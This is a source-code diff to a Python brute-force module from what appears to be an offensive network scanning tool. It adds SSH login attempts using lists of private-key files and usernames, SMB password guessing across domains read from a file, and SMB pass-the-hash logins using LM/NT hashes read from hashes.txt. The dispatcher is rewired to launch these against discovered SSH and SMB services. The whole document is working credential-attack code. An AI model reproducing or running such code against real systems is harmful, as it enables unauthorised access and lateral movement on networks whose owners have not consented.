@@ -6,12 +6,13 @@
 # @Author: funnywolf
 # @Contact : github.com/FunnyWolf
 
-import Queue
 import binascii
 import json
 import threading
 import time
 from ftplib import FTP
+
+import Queue
 
 from bruteforce.password import Password_total
 from lib.config import logger, log_success
@@ -43,20 +44,6 @@ class SSH_login(object):
     def __init__(self, timeout=1):
         self.timeout = timeout
 
-    def login(self, ipaddress, port, user_passwd_pair_list):
-        for user_passwd_pair in user_passwd_pair_list:
-            try:
-
-                client = ParallelSSHClient(hosts=[ipaddress], port=port, user=user_passwd_pair[0],
-                                           password=user_passwd_pair[1], num_retries=0, timeout=self.timeout)
-                output = client.run_command('whoami', timeout=self.timeout)
-                log_success("SSH", ipaddress, port, user_passwd_pair)
-            except Exception as E:
-                logger.debug('AuthenticationException: ssh')
-                continue
-            finally:
-                pass
-
     def login_with_pool(self, ipaddress, port, user_passwd_pair_list, pool_size=10):
         for user_passwd_pair in user_passwd_pair_list:
             try:
@@ -70,6 +57,31 @@ class SSH_login(object):
                 continue
             finally:
                 pass
+
+    def login_with_pool_key(self, ipaddress, port, key_file_path_list, pool_size=10):
+        try:
+            with open("user.txt") as f:
+                users = []
+                lines = f.readlines()
+                for line in lines:
+                    users.append(line.strip())
+        except Exception as E:
+            users = ["root"]
+        for key_file_path in key_file_path_list:
+            for user in users:
+                try:
+                    client = ParallelSSHClient(hosts=[ipaddress], port=port, user=user, pkey=key_file_path,
+                                               num_retries=0,
+                                               timeout=self.timeout,
+                                               pool_size=pool_size)
+                    output = client.run_command('whoami', timeout=self.timeout)
+
+                    log_success("SSH", ipaddress, port, [user, "key: {}".format(key_file_path)])
+                except Exception as E:
+                    logger.debug('AuthenticationException: ssh')
+                    continue
+                finally:
+                    pass
 
 
 class FTP_login(object):
@@ -117,16 +129,66 @@ class SMB_login(object):
         self.timeout = timeout
 
     def login(self, ipaddress, port, user_passwd_pair_list):
+
+        try:
+            with open("domain.txt") as f:
+                domains = []
+                lines = f.readlines()
+                for line in lines:
+                    domains.append(line.strip())
+                domains.append("")
+        except Exception as E:
+            domains = [""]
+
         for user_passwd_pair in user_passwd_pair_list:
+            for domain in domains:
+                try:
+                    fp = SMBConnection('*SMBSERVER', ipaddress, sess_port=int(port), timeout=self.timeout)
+                except Exception as E:
+                    logger.debug('ConnectException: {} {} {}'.format(E, ipaddress, port))
+                    return
+                try:
+                    if fp.login(user_passwd_pair[0], user_passwd_pair[1], domain=domain):
+                        if fp.isGuestSession() == 0:
+                            if domain == "":
+                                log_success("SMB", ipaddress, port, user_passwd_pair)
+                            else:
+                                log_success("SMB", ipaddress, port,
+                                            ["{}/{}".format(domain, user_passwd_pair[0]),
+                                             user_passwd_pair[1]
+                                             ])
+
+                except Exception as E:
+                    logger.debug('AuthenticationException: %s' % E)
+                finally:
+                    fp.getSMBServer().get_socket().close()
+
+    def login_with_hash(self, ipaddress, port):
+        try:
+            with open("hashes.txt") as f:
+                user_hash_pair_list = []
+                lines = f.readlines()
+                for line in lines:
+                    user_hash_pair_list.append(line.strip().split(","))
+        except Exception as E:
+            return
+
+        for user_hash_pair in user_hash_pair_list:
             try:
                 fp = SMBConnection('*SMBSERVER', ipaddress, sess_port=int(port), timeout=self.timeout)
             except Exception as E:
                 logger.debug('ConnectException: {} {} {}'.format(E, ipaddress, port))
                 return
             try:
-                if fp.login(user_passwd_pair[0], user_passwd_pair[1], ""):
+                if fp.login(user_hash_pair[1], "",
+                            domain=user_hash_pair[0],
+                            lmhash=user_hash_pair[2].split(":")[0],
+                            nthash=user_hash_pair[2].split(":")[1]):
                     if fp.isGuestSession() == 0:
-                        log_success("SMB", ipaddress, port, user_passwd_pair)
+                        log_success("SMB", ipaddress, port, [
+                            "{}/{}".format(user_hash_pair[0], user_hash_pair[1]),
+                            user_hash_pair[2]
+                        ])
 
             except Exception as E:
                 logger.debug('AuthenticationException: %s' % E)
@@ -507,7 +569,7 @@ class Runer(object):
             t.join()
 
 
-def bruteforce_interface(portScan_result_list, timeout, no_default_dict, proto_list, pool):
+def bruteforce_interface(portScan_result_list, timeout, no_default_dict, proto_list, pool, ssh_keys):
     password_total = Password_total()
     password_total.init(no_default_dict)
     try:
@@ -521,10 +583,10 @@ def bruteforce_interface(portScan_result_list, timeout, no_default_dict, proto_l
             if "postgresql" in service and "postgresql" in proto_list:
                 tasksQueue.put(
                     (postgreSQL_login.login, (ipaddress, port, password_total.PostgreSQL_user_passwd_pair_list)))
-
-        runner = Runer(100)
-        runner.taskQueue = tasksQueue
-        runner.start()
+        if tasksQueue.empty() is not True:
+            runner = Runer(100)
+            runner.taskQueue = tasksQueue
+            runner.start()
     except Exception as E:
         logger.warning("Can not import OpenSSL,PostgreSQL pass")
 
@@ -566,6 +628,8 @@ def bruteforce_interface(portScan_result_list, timeout, no_default_dict, proto_l
 
         if "ssh" in service and "ssh" in proto_list:  # 原生支持协程,直接扫描
             ssh_login.login_with_pool(ipaddress, port, password_total.SSH_user_passwd_pair_list, pool.size)
+            if len(ssh_keys) > 0:
+                ssh_login.login_with_pool_key(ipaddress, port, ssh_keys, pool.size)
 
         if "mongodb" in service and "mongodb" in proto_list:
             task = pool.spawn(mongo_login.login, ipaddress, port, password_total.MongoDB_user_passwd_pair_list)
@@ -573,8 +637,10 @@ def bruteforce_interface(portScan_result_list, timeout, no_default_dict, proto_l
         if "ftp" in service and "ftp" in proto_list:
             task = pool.spawn(ftp_login.login, ipaddress, port, password_total.FTP_user_passwd_pair_list)
             tasks.append(task)
-        if "microsoft-ds" in service and "smb" in proto_list:
+        if ("microsoft-ds" in service or "smb" in service) and "smb" in proto_list:
             task = pool.spawn(smb_login.login, ipaddress, port, password_total.SMB_user_passwd_pair_list)
+            tasks.append(task)
+            task = pool.spawn(smb_login.login_with_hash, ipaddress, port)
             tasks.append(task)
         if "mysql" in service and "mysql" in proto_list:
             task = pool.spawn(mysql_login.login, ipaddress, port, password_total.MYSQL_user_passwd_pair_list)
